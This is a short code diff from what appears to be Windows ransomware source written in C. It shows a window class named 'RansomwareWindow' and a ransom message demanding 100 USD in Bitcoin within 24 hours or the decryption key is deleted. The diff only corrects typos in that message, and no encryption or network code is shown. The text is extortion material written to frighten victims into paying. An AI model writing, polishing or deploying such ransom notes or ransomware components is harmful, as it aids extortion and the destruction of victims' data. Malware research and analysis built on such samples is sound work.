@@ -18,9 +18,9 @@ time_t gExpiryTime = 0;
 const char g_szClassName[] = "RansomwareWindow";
 
 // Ransom message
-const char message[] =  "Oh-oh! Many of your files have been encrypted. You will lose them permanently unless you follow the instrcutions.\r\n" 
+const char message[] =  "Oh-oh! Many of your files have been encrypted. You will lose them permanently unless you follow the instructions.\r\n" 
                         "To get your files back you need to pay 100 USD to the BitCoin address below. Check the payment status with the button. "
-                        "If it went through fit <Decrypt> to get your documents back. There may be a 1-hour delay between your payment and the successful decryption.\r\n" 
+                        "Once verified hit <Decrypt> to get your documents back. There may be a 1-hour delay between your payment and the successful decryption.\r\n" 
                         "This is the only way to recover your documents. If you fail to pay within 24 hours, the decryption key will be deleted and your files gone forever.\r\n"
                         "You can look for instructions on BitCoin payments on the internet. Hurry up! Time is ticking...";
 
